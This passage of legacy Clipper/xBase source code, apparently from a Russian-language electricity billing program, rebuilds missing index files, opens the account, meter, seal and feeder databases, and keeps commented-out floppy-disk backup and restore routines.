 IF .not.File(DDir+'BS1.ntx').or..not.File(DDir+'BS2.ntx')
    make_ind('0',DDir+'BSmain.dbf',DDir+'BS1.ntx','lic_schet',DDir+'BS2.ntx','MyUpper(potrebitel)',.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'LoseLic.ntx').or..not.File(Schet_Share+'LoseKod.ntx')
    make_ind('0',schet_share+'Lose.dbf',schet_share+'LoseLic.ntx','licevoj',schet_share+'LoseKod.ntx','Kod',.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'LoseTLic.ntx').or..not.File(Schet_Share+'LoseTKod.ntx')
    make_ind('0',schet_share+'LoseTran.dbf',schet_share+'LoseTLic.ntx','licevoj',schet_share+'LoseTKod.ntx','Kod',.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+'Lic_Sch.ntx').or..not.File(Schet_Share+'Schetchi.ntx')
    make_ind('0',schet_share+'licevoj.dbf',schet_share+'lic_sch.ntx','lic_sch',schet_share+'schetchi.ntx','schetchik',.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"NameIn.Ntx")
    make_ind('0',schet_share+'NameIn.Dbf',schet_share+'NameIn.ntx','Number',,,.t.,.f.)
 ENDIF
 IF .not.File(Schet_Share+"CountIn.Ntx")
    make_ind('0',schet_share+'CountIn.Dbf',schet_share+'CountIn.ntx','Number',,,.t.,.f.)
 ENDIF
 IF .not.File(Schet_Share+"PH.Ntx")
    make_ind('0',schet_share+'PH.Dbf',schet_share+'PH.ntx','Licevoj',,,.t.,.f.)
 ENDIF
 IF .not.File(Schet_Share+"Limit2.Ntx")
    make_ind('0',schet_share+'Limit2.Dbf',schet_share+'Limit2.ntx','Lic_Schet',,,.t.,.f.)
 ENDIF
 IF .not.File(Schet_Share+"OutBlank.Ntx")
    make_ind('0',schet_share+'OutBlank.Dbf',schet_share+'OutBlank.ntx','Licevoj',,,.t.,.f.)
 ENDIF
 IF .not.File(Schet_Share+"Plomba.Ntx").or..not.File(Schet_Share+"PlZagim.Ntx").or..not.File(Schet_Share+"PlA.Ntx").or.;
          .not.File(Schet_Share+"PlB.Ntx").or..not.File(Schet_Share+"PlC.Ntx").or..not.File(Schet_Share+"PlPlVvod.Ntx").or.;
          .not.File(Schet_Share+"Plpanel.Ntx")
    make_ind('0',schet_share+'Plomba.Dbf',schet_share+'Plomba.ntx','Kod',schet_share+'PlZagim.ntx',"Zagim",.t.,.t.)
    make_ind('0',schet_share+'Plomba.Dbf',schet_share+'PlA.ntx','PhaseA',schet_share+'PlB.ntx',"PhaseB",.t.,.t.)
    make_ind('0',schet_share+'Plomba.Dbf',schet_share+'PlC.ntx','PhaseC',schet_share+'PlVvod.ntx',"VvodPlomba",.t.,.t.)
    make_ind('0',schet_share+'Plomba.Dbf',schet_share+'Plpanel.ntx','Panel',,,.t.,.t.)
 ENDIF
 IF .not.File(DDir+"PlLocal.Ntx")
    make_ind('0',DDir+'PlLocal.Dbf',DDir+'PlLocal.ntx','Kod',,,.t.,.t.)
 EndIf
 IF .not.File(Schet_Share+"FidersN.Ntx").or..not.File("FidersC.Ntx")
    make_ind('0',schet_share+'Fiders.dbf',schet_share+'FidersN.ntx','kod',,,.t.,.t.)
    make_ind('0',schet_share+'Fiders.dbf',schet_share+'FidersC.ntx','Fider',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"FidersSN.Ntx")
    make_ind('0',schet_share+'Fiderssc.dbf',schet_share+'FidersSN.ntx','kod',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"Fnsi.Ntx")
    make_ind('0',schet_share+'Fnsi.dbf',schet_share+'Fnsi.ntx','KA',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"FnsiKUL.Ntx")
    make_ind('0',schet_share+'Fnsi.dbf',schet_share+'FnsiKUL.ntx','KUL',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"Fosn.Ntx")
    make_ind('0',schet_share+'Fosn.dbf',schet_share+'Fosn.ntx','KA',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"FosnCS.Ntx")
    make_ind('0',schet_share+'Fosn.dbf',schet_share+'FosnCS.ntx','CHSearch',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"FosnKOD.Ntx")
    make_ind('0',schet_share+'Fosn.dbf',schet_share+'FosnKOD.ntx','KOD',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"Fyear.Ntx")
    make_ind('0',schet_share+'Fyear.dbf',schet_share+'Fyear.ntx','KA',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"FyearKOD.Ntx")
    make_ind('0',schet_share+'Fyear.dbf',schet_share+'FyearKOD.ntx','KOD',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"FSch.Ntx")
    make_ind('0',schet_share+'FSch.dbf',schet_share+'FSch.ntx','KTS',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"FSign.Ntx")
    make_ind('0',schet_share+'FSign.dbf',schet_share+'FSign.ntx','Symbol',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"Fkods.Ntx")
    make_ind('0',schet_share+'Fkods.dbf',schet_share+'Fkods.ntx','Kul',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"Fvo.Ntx")
    make_ind('0',schet_share+'Fvo.dbf',schet_share+'Fvo.ntx','Kvo',,,.t.,.t.)
 ENDIF
 IF .not.File(Schet_Share+"Obhod.Ntx")
    make_ind('0',schet_share+'Obhod.dbf',schet_share+'Obhod.ntx','Licevoj',,,.t.,.t.)
 ENDIF
 IF .not.File(Ddir+"Copl.Ntx")
    make_ind('0',DDir+'Copl.dbf',DDir+'Copl.ntx','Lic',,,.t.,.t.)
 ENDIF
 For I=1 To 12
     oInd:=Schet_Share+"O"+AllTrim(Str(i,2))+".Ntx"
     IF .not.File(oInd)
        oBase:=Schet_Share+"O"+AllTrim(Str(i,2))+".DBF"
        make_ind('0',oBase,oInd,'Licevoj',,,.t.,.t.)
     ENDIF
     oInd:=Schet_Share+"P"+AllTrim(Str(i,2))+".Ntx"
     IF .not.File(oInd)
        oBase:=Schet_Share+"P"+AllTrim(Str(i,2))+".DBF"
        make_ind('0',oBase,oInd,'Licevoj',,,.t.,.t.)
     ENDIF
     oInd:=Schet_Share+"H"+AllTrim(Str(i,2))+".Ntx"
     IF .not.File(oInd)
        oBase:=Schet_Share+"H"+AllTrim(Str(i,2))+".DBF"
        make_ind('0',oBase,oInd,'Licevoj',,,.t.,.t.)
     ENDIF
     oInd:=Schet_Share+"A"+AllTrim(Str(i,2))+".Ntx"
     IF .not.File(oInd)
        oBase:=Schet_Share+"A"+AllTrim(Str(i,2))+".DBF"
        make_ind('0',oBase,oInd,'Licevoj',,,.t.,.t.)
     ENDIF
 Next
 Close All

// Базы с монопольным доступом
load('66',Ddir+'reestr.dbf')
load('43',DDIR+'PlLocal.dbf',DDir+"PlLocal.Ntx")
load('45',DDIR+'TOpl.dbf')
//load('66',Ddir+'reestr.dbf')
load('89',DDir+'BSmain.dbf',DDir+'BS1.ntx',DDir+'BS2.ntx')
load('78',Ddir+'licevoj2.dbf')
load('200',Ddir+'all_mont.dbf')
load('202',Ddir+'COpl.dbf',DDir+"COpl.Ntx")
// Базы с коллективным использованием
 load('1',SCHET_SHARE+'jan.dbf',SCHET_SHARE+'jan_kod.ntx',,.f.)
 load('2',SCHET_SHARE+'feb.dbf',SCHET_SHARE+'feb_kod.ntx',,.f.)
 load('3',SCHET_SHARE+'mar.dbf',SCHET_SHARE+'mar_kod.ntx',,.f.)
 load('4',SCHET_SHARE+'apr.dbf',SCHET_SHARE+'apr_kod.ntx',,.f.)
 load('5',SCHET_SHARE+'may.dbf',SCHET_SHARE+'may_kod.ntx',,.f.)
 load('6',SCHET_SHARE+'jun.dbf',SCHET_SHARE+'jun_kod.ntx',,.f.)
 load('7',SCHET_SHARE+'jul.dbf',SCHET_SHARE+'jul_kod.ntx',,.f.)
 load('8',SCHET_SHARE+'aug.dbf',SCHET_SHARE+'aug_kod.ntx',,.f.)
 load('9',SCHET_SHARE+'sep.dbf',SCHET_SHARE+'sep_kod.ntx',,.f.)
 load('10',SCHET_SHARE+'oct.dbf',SCHET_SHARE+'oct_kod.ntx',,.f.)
 load('11',SCHET_SHARE+'nov.dbf',SCHET_SHARE+'nov_kod.ntx',,.f.)
 load('12',SCHET_SHARE+'dec.dbf',SCHET_SHARE+'dec_kod.ntx',,.f.)
 load("13",SCHET_SHARE+'dec_.dbf',SCHET_SHARE+'dec__kod.ntx',,.f.)
 load('15',SCHET_SHARE+'obormot.dbf',SCHET_SHARE+'lic_obor.ntx',,.f.)
 load('99',SCHET_SHARE+'penq.dbf',SCHET_SHARE+'lic_penq.ntx',,.f.)

load("18", SCHET_SHARE+"SFKNIGA.DBF", schet_share+"SFKNIGA.NTX", schet_share+"SFKNIGAL.NTX", .f.)
load("19", SCHET_SHARE+"SFKNIGAP.DBF",schet_share+"SFKNIGAP.NTX",,.f.)
load('32',SCHET_SHARE+'limit2.dbf',SCHET_SHARE+'limit2.ntx',,.f.)
load('33',SCHET_SHARE+'limit.dbf',SCHET_SHARE+'lic_limi.ntx',,.f.)
Load("34",SCHET_SHARE+"PH.Dbf",  SCHET_SHARE+"PH.Ntx" ,,.f.)
Load("40",SCHET_SHARE+"NameIn.Dbf",   SCHET_SHARE+"NameIn.Ntx"  ,,.f.)
Load("41",SCHET_SHARE+"CountIn.Dbf",  SCHET_SHARE+"CountIn.Ntx" ,,.f.)
Load("42",SCHET_SHARE+"Plomba.Dbf",  SCHET_SHARE+"Plomba.Ntx" ,SCHET_SHARE+"PlZagim.Ntx" ,.f.,SCHET_SHARE+'PlA.ntx',SCHET_SHARE+'PlB.ntx',SCHET_SHARE+'PlC.ntx',SCHET_SHARE+"PlVvod.Ntx",,SCHET_SHARE+"PlPanel.Ntx" )
load('55',SCHET_SHARE+'otrasl.dbf',,,.f.)
load('77',SCHET_SHARE+'licevoj.dbf',SCHET_SHARE+'lic_sch.ntx',SCHET_SHARE+'schetchi.ntx',.f.)
load('85',SCHET_SHARE+'Obhod.dbf',SCHET_SHARE+'Obhod.ntx',,.f.)
load('86',SCHET_SHARE+'LoseTran.dbf',SCHET_SHARE+'LoseTKod.ntx',SCHET_SHARE+'LoseTLic.ntx',.f.)
load('87',SCHET_SHARE+'Lose.dbf',SCHET_SHARE+'LoseKod.ntx',SCHET_SHARE+'LoseLic.ntx',.f.)
load('88',SCHET_SHARE+'main.dbf',SCHET_SHARE+'lic.ntx',SCHET_SHARE+'potrebit.ntx',.f.)
load("110",SCHET_SHARE+"tobank.dbf",  SCHET_SHARE+'tobank.ntx',SCHET_SHARE+'tobankl.ntx',  .f.)
load("100",SCHET_SHARE+"bank_Kod.dbf",SCHET_SHARE+'bank_kod.ntx',,  .f.)
load("101",SCHET_SHARE+"blank.dbf",,,  .f.)
load("102",SCHET_SHARE+"OutBlank.dbf",SCHET_SHARE+'OutBlank.ntx',,  .f.)
load("103",SCHET_SHARE+"FNSI.dbf",SCHET_SHARE+'FNSI.ntx',SCHET_SHARE+'FNSIKUL.ntx',  .f.)
load("104",SCHET_SHARE+"FOSN.dbf",SCHET_SHARE+'FOSN.ntx',SCHET_SHARE+'FOSNCS.ntx',  .f.,SCHET_SHARE+'FOSNKOD.ntx')
//load("104",SCHET_SHARE+"FOSN.dbf",SCHET_SHARE+'FOSN.ntx',SCHET_SHARE+'FOSNCS.ntx',  .f.)

load("105",SCHET_SHARE+"FYear.dbf",SCHET_SHARE+'FYear.ntx',SCHET_SHARE+'FYearKOD.ntx',  .f.)
load("106",SCHET_SHARE+"Fkods.dbf",SCHET_SHARE+'Fkods.ntx',,  .f.)
load("107",SCHET_SHARE+"Fsch.dbf",SCHET_SHARE+'Fsch.ntx',,  .f.)
load("108",SCHET_SHARE+"Fvo.dbf",SCHET_SHARE+'Fvo.ntx',,  .f.)
win_rest(loadgoscr)
setcolor(color_24)
Return NIL



/*  Ненужные функции или функции временно удаленные из кода
STATIC function writedisk()
len=adir(schet_Adisk+'\#*.*')
declare prov[len]
adir(schet_Adisk+'\#*.*',prov)
oshib=.t.
if len=0
        oshib=.f.
else
        for i=1 to len
                if substr(alltrim(MYupper(prov[i])),1,1)='#'
                        oshib=.f.
                endif
        next
endif
if .not.oshib
        makecopy()      //     Сразу копия и на винт makecopy()
        save screen
        commit
        close all
        message("    Ж Д И Т Е ...   ")
        filedelete(schet_Adisk+'\*.*')
        fclose(fcreate(schet_Adisk+'\#'+alltrim(substr(kniga,2))))
        restore screen
        error=.f.
        count=adir(Schet_Share+'*.db*')
        declare files[count]
        adir(Schet_Share+'*.db*',files)
        if count>1
                for i=1 to count
                        if copy_(Schet_Share+files[i],schet_Adisk+'\'+files[i])=0
                                error=.t.
                                exit
                        endif
                next
                if error
                        al_box({' Произшла ошибка гибкого диска, процесс остановлен '};
                                ,,,,,,,,,'gr+/r,w+/b')
                else
                        al_box({'Резервная копия создана успешно, ошибок нет'};
                                ,,,,,,,,,'w+/b,n/w')
                endif
                save screen

                message('Ждите, происходит загрузка данных в память')
                loadgos()

                restore screen
        else
                Myerror('Отсутствуют базы данных для создания резервной копии !!! ')
        endif
else
        do case
                case prov[1]='#13'
                        stroka='книгой 1'
                case prov[1]="#14"
                        stroka='книгой 2'
                case prov[1]="#15"
                        stroka='книгами 3,4'
                case prov[1]="#16"
                        stroka='книгами 5,6'
                case prov[1]="#17"
                        stroka='книгой 7'
                otherwise
                        stroka='базами данных программы'
        endcase
        al_box({"Вы вставили не тот диск в дисковод "+schet_Adisk,;
               "Вставлен диск с "+stroka,;
               "Вставьте нужный диск и повторите чтение "};
               ,,,,,,,,,'gr+/r,w+/b')
endif
return NIL


STATIC function readdisk()
//message_wait("Вставьте диск в дисковод "+schet_Adisk+" ")
if diskready(schet_Adisk)
        all=if(al_box({"Какую информацию считать с диска "+schet_Adisk+'?'},2,;
        {"Всю информацию","Только оплату"})=1,.T.,.F.)
        error=.f.
        close all
        count=adir(schet_Adisk+'\*.db*')
        declare files[count]
        adir(schet_Adisk+'\*.db*',files)
        len=adir(schet_Adisk+'\#*.*')
        declare prov[len]
        adir(schet_Adisk+'\#*.*',prov)
        oshib=.t.
        if len=0
                oshib=.f.
        else
                for i=1 to len
                        if alltrim(MYupper(prov[i]))='#'+alltrim(MYupper(substr(kniga,2)))
                                oshib=.f.
                        endif
                next
        endif
        if .not.oshib
                if count>1
                        for i=1 to count
                           if all
                                if copy_(schet_Adisk+'\'+files[i],path_copy+files[i])=0
                                        error=.t.
                                        wosst=.t.
                                        zagruzka=.f.
                                        exit
                                endif
                           else
                             if val(substr(alltrim(files[i]),2,1))>0.or.alltrim(MYupper(files[i]))='OBORMOT.DBF'
                                if copy_(schet_Adisk+'\'+files[i],path_copy+files[i])=0
                                        error=.t.
                                        wosst=.t.
                                        zagruzka=.f.
                                        exit
                                endif
                             endif
                           endif
                        next
                else
                        al_box({'Резервная копия не обнаружена'};
                                ,,,,,,,,,'gr+/r,w+/b')
                        error=.t.
                endif
                if error
                        al_box({" Ошибка гибкого диска.  Не удалось  считать  всю  информацию ",;
                               ' с диска в память машины. Восстановите фалы с жесткого диска '};
                               ,,,,,,,,,'gr+/r,w+/b')
                else
                        do servis2
                        al_box({'Считана '+if(all,' вся информация ',' только оплата ')+' с гибкого диска '+schet_Adisk})
                        zagruzka=.t.
                        wosst=.f.
                        rec88=0
                endif
        else
                do case
                        case prov[1]='#13'
                                stroka='книгой N 1'
                        case prov[1]="#14"
                                stroka='книгой N 2'
                        case prov[1]="#14"
                                stroka='книгами N 3,4'
                        case prov[1]="#14"
                                stroka='книгами N 5,6'
                        case prov[1]="#14"
                                stroka='книгой N 7'
                endcase
                al_box({"     Вы вставили не тот диск в дисковод "+schet_Adisk+'       ',;
                       "     Вставлен диск с "+stroka,;
                       "     Вставьте нужный диск и повторите чтение "};
                       ,,,,,,,,,'gr+/r,w+/b')
        endif
        else
                al_box({"  Нет диска в дисководe  "};
                        ,,,,,,,,,'gr+/r,w+/b')
        endif
return NIL

*/
